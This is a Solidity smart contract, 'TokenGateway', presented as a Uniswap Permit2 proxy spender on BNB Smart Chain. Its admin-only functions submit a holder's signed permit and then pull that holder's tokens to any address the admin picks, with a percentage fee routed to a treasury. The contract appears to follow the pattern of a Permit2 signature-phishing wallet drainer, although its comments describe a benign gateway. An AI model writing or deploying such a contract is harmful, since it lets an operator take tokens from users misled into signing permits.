// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPermit2 {
    struct TokenDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct SinglePermit {
        TokenDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(
        address tokenHolder,
        SinglePermit calldata singlePermit,
        bytes calldata signature
    ) external;

    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;

    function allowance(
        address tokenHolder,
        address token,
        address spender
    ) external view returns (uint160 amount, uint48 expiration, uint48 nonce);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

/**
 * @title TokenGateway
 * @notice Proxy spender for Uniswap Permit2 on BNB Smart Chain.
 *         Users sign a bounded Permit2 allowance (amount + expiry).
 *         Admin can pull up to the approved amount before expiry.
 */
contract TokenGateway {
    address public admin;
    address public treasury;
    bool public paused;
    uint16 public feeBps;                     // 0..1000 (max 10%)

    address public constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    event AdminTransferred(address indexed prev, address indexed next);
    event TreasurySet(address indexed treasury);
    event PausedSet(bool paused);
    event FeeSet(uint16 feeBps);
    event PermitProcessed(address indexed tokenHolder, address indexed token, uint160 amount);
    event TransferProcessed(address indexed from, address indexed to, uint160 amount, address indexed token);

    modifier onlyAdmin() {
        require(msg.sender == admin, "TokenGateway: not admin");
        _;
    }

    modifier notPaused() {
        require(!paused, "TokenGateway: paused");
        _;
    }

    constructor() {
        admin = msg.sender;
        treasury = msg.sender;
        emit AdminTransferred(address(0), msg.sender);
    }

    /* ---------------- Admin config ---------------- */

    function setAdmin(address a) external onlyAdmin {
        require(a != address(0), "zero admin");
        emit AdminTransferred(admin, a);
        admin = a;
    }

    function setTreasury(address t) external onlyAdmin {
        require(t != address(0), "zero treasury");
        treasury = t;
        emit TreasurySet(t);
    }

    function setPaused(bool p) external onlyAdmin {
        paused = p;
        emit PausedSet(p);
    }

    function setFee(uint16 f) external onlyAdmin {
        require(f <= 1000, "fee too high");
        feeBps = f;
        emit FeeSet(f);
    }

    /* ---------------- Core actions ---------------- */

    /// @notice Submit user's signed Permit2 message to set on-chain allowance.
    function executePermit(
        address tokenHolder,
        IPermit2.SinglePermit calldata sp,
        bytes calldata sig
    ) public onlyAdmin {
        IPermit2(PERMIT2).permit(tokenHolder, sp, sig);
        emit PermitProcessed(tokenHolder, sp.details.token, sp.details.amount);
    }

    /// @notice Pull tokens using an existing on-chain Permit2 allowance.
    function executeTransfer(
        address from,
        address to,
        uint160 amount,
        address token
    ) public onlyAdmin notPaused {
        IPermit2(PERMIT2).transferFrom(from, to, amount, token);
        emit TransferProcessed(from, to, amount, token);
    }

    /// @notice Submit permit + pull in one transaction. Optional fee split.
    function executePermitAndTransfer(
        address tokenHolder,
        IPermit2.SinglePermit calldata sp,
        bytes calldata sig,
        address to,
        uint160 amount
    ) external onlyAdmin notPaused {
        IPermit2(PERMIT2).permit(tokenHolder, sp, sig);
        emit PermitProcessed(tokenHolder, sp.details.token, sp.details.amount);

        if (feeBps > 0 && treasury != address(0)) {
            uint160 fee = uint160((uint256(amount) * feeBps) / 10_000);
            uint160 net = amount - fee;
            IPermit2(PERMIT2).transferFrom(tokenHolder, treasury, fee, sp.details.token);
            IPermit2(PERMIT2).transferFrom(tokenHolder, to, net, sp.details.token);
            emit TransferProcessed(tokenHolder, treasury, fee, sp.details.token);
            emit TransferProcessed(tokenHolder, to, net, sp.details.token);
        } else {
            IPermit2(PERMIT2).transferFrom(tokenHolder, to, amount, sp.details.token);
            emit TransferProcessed(tokenHolder, to, amount, sp.details.token);
        }
    }

    /* ---------------- Rescue ---------------- */

    function rescueTokens(address token, address to, uint256 amount) external onlyAdmin {
        IERC20(token).transfer(to, amount);
    }

    function rescueBNB(address payable to, uint256 amount) external onlyAdmin {
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "bnb transfer failed");
    }

    receive() external payable {}
}
